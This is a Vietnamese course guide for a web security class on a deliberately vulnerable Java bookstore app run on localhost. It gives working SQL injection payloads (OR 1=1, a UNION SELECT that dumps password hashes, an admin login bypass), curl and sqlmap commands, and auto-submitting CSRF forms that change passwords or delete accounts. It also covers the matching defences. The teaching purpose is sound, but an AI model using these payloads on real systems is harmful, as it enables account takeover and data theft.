# 🔓 HƯỚNG DẪN CÁC LỖ HỔNG BẢO MẬT - JVA BOOKSTORE

## 📚 Khóa học: An Toàn Ứng Dụng Web (HCMUTE)

---

## PHẦN 1: SQL INJECTION (Tiêm SQL)

### 1.1 SQL Injection là gì?

**SQL Injection** là lỗ hổng cho phép attacker (kẻ tấn công) chèn code SQL vào input của ứng dụng để:
- Lấy dữ liệu bí mật (credentials, payment info)
- Sửa/xóa dữ liệu
- Bypass xác thực (login without password)
- Làm hỏng database

### 1.2 Nguyên nhân

❌ **KHÔNG AN TOÀN** - Nối chuỗi trực tiếp:
```java
String sql = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(sql);
```

✅ **AN TOÀN** - Dùng PreparedStatement:
```java
String sql = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, username);  // User input ở đây là an toàn
ResultSet rs = stmt.executeQuery();
```

---

## PHẦN 2: SQL INJECTION Trong JVA Bookstore

### 2.1 Lỗ hổng 1: Tìm Kiếm Sách (Book Search)

**Endpoint**: `GET /api/books/search?q=...`

#### A. Cách hoạt động

Khi bạn tìm kiếm "fiction", app chạy:
```sql
SELECT b.id, b.title, b.author, b.isbn, ...
FROM books b 
WHERE 1=1 AND (b.title = 'fiction' OR b.author = 'fiction' OR b.isbn = 'fiction')
```

#### B. Tấn công & Payload

**Payload 1: Lấy toàn bộ sách**
```
https://localhost:8443/api/books/search?q=x') OR '1'='1
```

Thành:
```sql
WHERE 1=1 AND (b.title = 'x') OR '1'='1' OR ...)
-- '1'='1' luôn đúng → trả về TẤT CẢ sách
```

**Payload 2: Lấy thông tin user (UNION-based)**
```
https://localhost:8443/api/books/search?q=x') UNION SELECT 
  id, username, email, password_hash, 0::numeric, NULL, NULL, 0, NULL, 
  NULL::timestamp, NULL::timestamp, NULL, 0, NULL, 0, 0, 0, 0 
FROM users --
```

**Kết quả**: 
- Lấy được user ID, username, email
- **Password hash** của user (có thể crack later)

---

### 2.2 Lỗ hổng 2: Lọc Đơn Hàng Admin

**Endpoint**: `GET /api/admin/orders?q=...`

**Payload**:
```
https://localhost:8443/api/admin/orders?q=x' OR '1'='1' --&status=all
```

**Kết quả**: 
- Xem toàn bộ đơn hàng của tất cả users
- Bypass authorization check

---

### 2.3 Lỗ hổng 3: Đăng Nhập (Vulnerable Login)

**DAO Class**: `VulnerableLoginDAO.java`

**Payload - Bypass password**:
```
Username: admin' --
Password: anything123
```

Thành:
```sql
SELECT 1 FROM users WHERE username = 'admin' --
-- Phần password bị comment out, luôn đúng
```

**Kết quả**: Đăng nhập thành công **mà không cần password**!

**Payload - Bypass cả username và password**:
```
Username: ' OR '1'='1' --
Password: ' OR '1'='1' --
```

**Kết quả**: Đăng nhập thành user đầu tiên trong database (thường là admin)

---

## 3. CÁC ATTACK SCENARIOS

### Scenario 1: Lấy Credentials
```
1. Attacker dùng payload UNION SELECT
2. Lấy được username, email, password hash của tất cả users
3. Offline crack password (nếu hash yếu)
4. Đăng nhập vào tài khoản của victim
```

### Scenario 2: Bypass Authentication
```
1. Attacker không biết password admin
2. Dùng payload: admin' --
3. Đăng nhập thành công
4. Có quyền admin, xem/sửa/xóa tất cả data
```

### Scenario 3: Lấy Data Nhạy Cảm
```
1. Attacker tìm endpoint có SQL Injection
2. Dùng UNION SELECT lấy payment info, credit card
3. Bán data trên dark web
```

---

## 4. CÁC TOOLS TEST SQL INJECTION

### 4.1 Curl (Command Line)
```bash
# Test OR condition
curl --insecure "https://localhost:8443/api/books/search?q=a' OR '1'='1"

# Test UNION SELECT
curl --insecure "https://localhost:8443/api/books/search?q=x') UNION SELECT id, username, email, password_hash, 0::numeric, NULL, NULL, 0, NULL, NULL::timestamp, NULL::timestamp, NULL, 0, NULL, 0, 0, 0, 0 FROM users --"
```

### 4.2 Browser
1. Mở `https://localhost:8443`
2. Paste payload vào URL parameter
3. Xem response JSON

### 4.3 SQLMap (Tự động)
```bash
sqlmap -u "https://localhost:8443/api/books/search?q=test" --risk=1 --level=1 --dbs
```

---

## 5. PHÒNG CHỐNG SQL INJECTION

### Cách 1: Dùng PreparedStatement (QUAN TRỌNG!)
```java
// ❌ KHÔNG
String sql = "SELECT * FROM books WHERE title = '" + title + "'";

// ✅ CÓ
String sql = "SELECT * FROM books WHERE title = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, title);  // Parameter riêng, an toàn
```

### Cách 2: Input Validation
```java
// Whitelist các ký tự cho phép
if (!keyword.matches("^[a-zA-Z0-9\\s-]+$")) {
    throw new IllegalArgumentException("Invalid characters");
}
```

### Cách 3: Least Privilege
```java
// Database user chỉ có quyền SELECT, không DROP/DELETE
-- SQL
CREATE USER webapp_user WITH PASSWORD 'xxx';
GRANT SELECT, INSERT, UPDATE ON books TO webapp_user;
-- Không cho DROP, DELETE, ALTER
```

### Cách 4: Error Handling
```java
try {
    ResultSet rs = stmt.executeQuery();
} catch (SQLException e) {
    // Không hiện chi tiết lỗi cho user
    logger.error("Database error", e);
    resp.sendError(500, "Internal server error");
}
```

---

---

## PHẦN 2: CSRF (Tấn Công Giả Mạo Yêu Cầu Cross-Site)

### 2.1 CSRF là gì?

**CSRF** = Attacker lợi dụng việc bạn **đang đăng nhập** vào 1 website khác để gửi request to website đó mà bạn không biết.

### 2.2 Ví dụ CSRF

```
Bước 1: Bạn đăng nhập vào https://bookstore.local
        Browser lưu JWT token

Bước 2: Bạn vô trang attacker: https://attacker.com/free-gift
        Vẫn còn đăng nhập bookstore (tab khác)

Bước 3: Trang attacker chứa form ẩn:
        <form action="https://bookstore.local/api/checkout" method="POST">
          <input name="items" value="[1]">
          <script>document.forms[0].submit();</script>
        </form>

Bước 4: Form tự động gửi request
        Browser tự động kèm JWT token
        Bookstore xử lý → Mua hàng thành công!

Bước 5: Bạn bị charge tiền, không biết gì cả 😱
```

---

## PHẦN 3: CSRF Trong JVA Bookstore

### 3.1 Các Endpoint Vulnerable

**Tất cả POST/PUT/DELETE đều KHÔNG validate CSRF token:**

| Endpoint | Attack | Impact |
|----------|--------|--------|
| `POST /api/checkout` | Force mua hàng | Bị charge tiền |
| `PUT /api/profile/password` | Đổi password | Account takeover |
| `DELETE /api/profile/delete` | Xóa tài khoản | Mất data |
| `POST /api/profile/addresses` | Đổi địa chỉ | Hàng ship sai |
| `POST /api/reviews` | Post review giả | Spam, phá reputation |
| `POST /api/csrf-demo/*` | Nhiều attack khác | Demo educational |

---

### 3.2 Test CSRF Attack

#### A. Chuẩn bị

1. **Login vào app**:
   ```
   https://localhost:8443
   Đăng nhập account của bạn
   ```

2. **Start HTTP server cho trang attack**:
   ```bash
   cd D:\nguyenlien\HCMUTE\JVA-bookstore-sec
   python -m http.server 8000
   ```

3. **Mở trang attack**:
   ```
   http://localhost:8000/csrf-attack-demo.html
   ```

#### B. Trigger Attack

1. Click nút **"Nhấn Để Nhận Quà"**
2. Chọn loại attack (password, delete, address, money)
3. Click nút lần thứ 2
4. Kiểm tra browser console → Xem attack success notification

#### C. Verify Attack - Xác Minh CSRF Thành Công

##### ✅ Test 1: Verify Password Change

Nếu chọn attack "Change Password", mật khẩu được đổi thành **`attacker_hacked_password_12345`**

**Các bước xác minh:**

1. **Logout** khỏi account hiện tại:
   - Click Avatar → Logout
   - Hoặc clear localStorage: `localStorage.clear()` (console)

2. **Thử login với MẬT KHẨU CŨ** (password bạn dùng lúc login):
   ```
   URL: https://localhost:8443/login.jsp
   Email: [email của bạn]
   Password: [password cũ]
   ```
   **Kết quả**: ❌ **LOGIN FAIL** - "Invalid email or password"
   
   ⚠️ Điều này chứng tỏ password đã bị **thay đổi vĩnh viễn** bởi CSRF attack!

3. **Thử login với MẬT KHẨU MỚI từ attacker**:
   ```
   Email: [email của bạn]
   Password: attacker_hacked_password_12345
   ```
   **Kết quả**: ✅ **LOGIN SUCCESS** - Đăng nhập vào account!
   
   ⚠️ Attacker bây giờ có thể kiểm soát account của bạn!

**Evidence**: Mật khẩu được thay đổi mà USER KHÔNG HỀ BIẾT.

---

##### ✅ Test 2: Verify Delete Account

Sau khi chọn "Delete Account" attack:

1. **Logout**
2. **Thử login lại**:
   ```
   Email: [email cũ]
   Password: [password cũ]
   ```
3. **Kết quả**: ❌ **INVALID EMAIL** - Account đã bị **xóa vĩnh viễn**!

---

##### ✅ Test 3: Verify Address Change

Sau khi chọn "Change Address" attack:

1. **Vẫn đăng nhập** (hoặc login lại)
2. Vào **Profile/Shipping Address**
3. **Xem địa chỉ đã đổi** thành:
   - Địa chỉ: `123 Attacker Street`
   - Thành phố: `Attacker City`
   - Quốc gia: `Hacker Land`

**Điều này chứng tỏ**: Attacker có thể thay đổi thông tin giao hàng → các đơn hàng giao sai địa chỉ!

---

##### ✅ Test 4: Verify Money Transfer

Tương tự, kiểm tra xem tiền đã transfer đến account attacker hay chưa.

---

### 📊 Tóm Tắt Verification

| Attack Type | Cách Verify |
|:---|:---|
| **Password Change** | Logout → Login cũ fail, Login mới succeed |
| **Delete Account** | Logout → Login fail (account deleted) |
| **Address Change** | View profile → Địa chỉ thành `Attacker Street` |
| **Money Transfer** | Check account balance → Balance giảm |

---

**🔑 Key Point**: 
- Các thay đổi này **thực sự áp dụng** vào database
- User **không biết ai đã làm** vì không có prompt/confirmation
- Đây là lý do CSRF **rất nguy hiểm** - actions được execute **silently**

---

### 3.3 CSRF Payloads

**Payload 1: Đổi Password (Ẩn trong img tag)**
```html
<img src="https://localhost:8443/api/csrf-demo/change-password?newPassword=hacked&confirmPassword=hacked" width="0" height="0">
<!-- Trang load → request tự động gửi → password đổi thành "hacked" -->
```

**Payload 2: Xóa Account (Form ẩn)**
```html
<form id="csrf-form" method="POST" action="https://localhost:8443/api/csrf-demo/delete-account" style="display:none">
  <input name="confirm" value="true">
</form>
<script>
  // Chờ 2 giây, sau đó auto-submit
  setTimeout(() => document.getElementById('csrf-form').submit(), 2000);
</script>
```

**Payload 3: Đổi Địa Chỉ (Redirect order sang kẻ tấn công)**
```html
<form method="POST" action="https://localhost:8443/api/csrf-demo/update-address">
  <input name="address" value="123 HACKER STREET">
  <input name="city" value="CYBERCRIME CITY">
  <input name="country" value="DARK WEB">
  <script>document.forms[0].submit();</script>
</form>
```

---

### 3.4 Manual Testing CSRF (Kiểm Tra Thủ Công)

**Mục đích**: Phát hiện CSRF vulnerabilities bằng cách **kiểm tra request** liệu có CSRF token hay không

#### **A. Kiểm Tra bằng Browser Developer Tools**

**Step 1: Intercept Request**

1. Mở **Developer Tools** (F12)
2. Chuyển sang tab **Network**
3. **Reload trang** → POST request sẽ hiện lên

**Step 2: Kiểm tra Headers**

Tìm POST request đến `/api/csrf-demo/change-password`:

```
POST /api/csrf-demo/change-password HTTP/1.1
Host: localhost:8443
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGc...
Content-Type: application/x-www-form-urlencoded

newPassword=attacker_hacked_password_12345&confirmPassword=attacker_hacked_password_12345
```

**Step 3: Kiểm tra CSRF Token**

```
❌ KHÔNG có:
- _csrf parameter
- csrf_token parameter  
- X-CSRF-TOKEN header
- X-XSRF-TOKEN header

✅ CÓ (an toàn):
- Có CSRF token trong form hoặc header
- Server validate token trước xử lý
```

**Kết luận**: Nếu không có token → **VULNERABLE!**

---

#### **B. Kiểm Tra bằng Burp Suite (Professional)**

**Step 1: Setup Burp Suite**

1. Download Burp Suite Community: `https://portswigger.net/burp`
2. Cài đặt & mở Burp Suite
3. Configure browser proxy:
   - Firefox/Chrome Settings → Proxy
   - Set HTTP/HTTPS proxy: `127.0.0.1:8080`

**Step 2: Intercept Request**

1. Login vào bookstore: `https://localhost:8443`
2. Vào `/csrf-demo` endpoint
3. Click "Nhấn Để Nhận Quà"
4. Burp Suite sẽ **intercept POST request**

```
Burp Proxy tab sẽ show:
┌─────────────────────────────────────┐
│ Address: localhost:8443             │
│ Method: POST                        │
│ Path: /api/csrf-demo/change-password│
│ Headers:                            │
│   Authorization: Bearer ...         │
│   Content-Type: application/...     │
│ Body:                               │
│   newPassword=...&confirmPassword=..│
└─────────────────────────────────────┘
```

**Step 3: Kiểm tra Token**

```
RIGHT-CLICK request → Engagement tools → CSRF PoC

Nếu không phát hiện token → Burp sẽ cho:
"CSRF token not detected. Vulnerable!"
```

**Step 4: Generate PoC (Proof of Concept)**

```html
<!-- Burp tự động generate HTML PoC -->
<html>
<body onload="document.csrf.submit()">
<form action="https://localhost:8443/api/csrf-demo/change-password" 
      method="POST" name="csrf">
  <input type="hidden" name="newPassword" value="hacked">
  <input type="hidden" name="confirmPassword" value="hacked">
</form>
</body>
</html>
```

---

#### **C. Manual cURL Testing**

**Kiểm tra xem endpoint có validate CSRF không:**

```bash
# 1. Login & lấy token
curl -k -X POST https://localhost:8443/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"password"}' \
  -c cookies.txt

# 2. Lấy JWT token từ localStorage (hoặc response)
# Giả sử token là: eyJ0eXAi...

# 3. Test CSRF endpoint KHÔNG có token
curl -k -X POST https://localhost:8443/api/csrf-demo/change-password \
  -H "Authorization: Bearer eyJ0eXAi..." \
  -d "newPassword=hacked&confirmPassword=hacked" \
  -b cookies.txt

# 4. Nếu response là success → VULNERABLE!
# Nếu response là "CSRF token invalid" → SAFE
```

---

#### **D. Checklist Kiểm Tra CSRF**

| Kiểm Tra | Vulnerable? | Ghi Chú |
|:---|:---:|:---|
| POST/PUT/DELETE không có CSRF token | ❌ | Bắt buộc phải có |
| Không validate Origin header | ❌ | Check `Origin: https://...` |
| Không validate Referer header | ❌ | Check `Referer: https://...` |
| Không có SameSite cookie attribute | ⚠️ | Nên có: `SameSite=Strict` |
| Token không expire | ❌ | Token phải có TTL |
| Dùng GET cho state-changing | ❌ | Phải dùng POST/PUT/DELETE |
| Frontend tự động submit form | ❌ | Phải user confirm |

---

**🎯 Kết luận Manual Testing**:
- **Dễ phát hiện**: Không có CSRF token
- **Khó phát hiện**: Dùng AJAX + JSON, same-origin attacks
- **Best practice**: Dùng Burp Suite Professional để tự động scan

---

## 4. PHÒNG CHỐNG CSRF

### Cách 1: CSRF Token (Synchronizer Token Pattern)

```java
// Server: Tạo token lưu trong session
String csrfToken = UUID.randomUUID().toString();
req.getSession().setAttribute("_csrf_token", csrfToken);

// HTML: Gửi token trong form
<form method="POST" action="/api/checkout">
  <input type="hidden" name="_csrf" value="<%= session.getAttribute("_csrf_token") %>">
</form>

// Server: Validate token TRƯỚC khi process
String submitted = req.getParameter("_csrf");
String session = (String) req.getSession().getAttribute("_csrf_token");
if (!submitted.equals(session)) {
    throw new SecurityException("CSRF token invalid!");
}
```

### Cách 2: SameSite Cookie

```java
// Cấu hình cookie
Set-Cookie: auth_token=xyz; SameSite=Strict; Secure; HttpOnly

// Strict  = Cookie KHÔNG gửi cross-site
// Lax     = Cookie gửi khi top-level navigation
// None    = Cookie gửi mọi request (risky!)
```

### Cách 3: Check Origin Header

```java
String origin = req.getHeader("Origin");
if (!origin.equals("https://localhost:8443")) {
    throw new SecurityException("Invalid origin!");
}
```

### Cách 4: Double-Submit Cookie

```java
// Server gửi token trong cả cookie và hidden input
// Browser auto-match → nếu khác = CSRF
```

---

## 5. TESTING CHECKLIST

### SQL Injection:
- [ ] Test tìm kiếm với `' OR '1'='1`
- [ ] Test login bypass: `admin' --`
- [ ] Test UNION SELECT lấy user data
- [ ] Test boolean-based injection
- [ ] Verify PreparedStatement được dùng

### CSRF:
- [ ] Mở attack demo page từ browser khác
- [ ] Test password change CSRF
- [ ] Test delete account CSRF
- [ ] Verify origin/referer headers
- [ ] Check CSRF token validation
- [ ] Test SameSite cookie behavior

---

## 6. TOOLS & RESOURCES

### Testing Tools:
- **Burp Suite**: Professional penetration testing
- **OWASP ZAP**: Free web security scanner
- **SQLMap**: Automated SQL injection tester
- **Cookies.txt Manager**: Cookie inspection

### Learning Resources:
- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **Portswigger**: https://portswigger.net/web-security
- **HackTheBox**: https://www.hackthebox.com/
- **TryHackMe**: https://tryhackme.com/

---

## 7. SỰ NGUY HIỂM & IMPACT

### SQL Injection Impact:
- 🔴 **CRITICAL** - Full database compromise
- 🔴 Credential theft, identity theft
- 🔴 Data exfiltration
- 🔴 Data destruction
- 🔴 Privilege escalation

### CSRF Impact:
- 🔴 **CRITICAL** - Unauthorized actions on user behalf
- 🔴 Financial fraud (transfer, purchase)
- 🔴 Account takeover
- 🔴 Reputation damage
- 🔴 Malware distribution

---

## 8. TỔNG KẾT

| Lỗ Hổng | Nguyên Nhân | Phòng Chống |
|---------|-----------|-----------|
| **SQL Injection** | String concatenation | PreparedStatement |
| **CSRF** | Không validate token | Add CSRF token + validate |
| **XSS** | Output không escape | HTML encode + CSP headers |
| **Auth Bypass** | Logic lỏng | Password hashing + validation |
| **File Upload** | Không validate file | Whitelist + store outside web root |

---

## 9. DISCLAIMER ⚠️

**Những lỗ hổng này được tạo intentionally cho mục đích GIÁO DỤC.**

✅ Được phép:
- Test trên ứng dụng của bạn
- Học cách hoạt động của attack
- Viết báo cáo cho khóa học
- Thảo luận trong classroom

❌ KHÔNG được phép:
- Test trên website khác mà không permission
- Chia sẻ exploit code ra ngoài
- Tấn công production systems
- Sử dụng cho mục đích xấu

---

## LIÊN HỆ HỖ TRỢ

Nếu có câu hỏi:
- Hỏi GV lý thuyết
- Hỏi bộ môn An Toàn Ứng Dụng
- Reference OWASP documentation

---

**Ngày tạo**: 25/03/2026  
**Môn học**: An Toàn Ứng Dụng Web (HCMUTE)  
**Status**: Sẵn sàng test & học tập
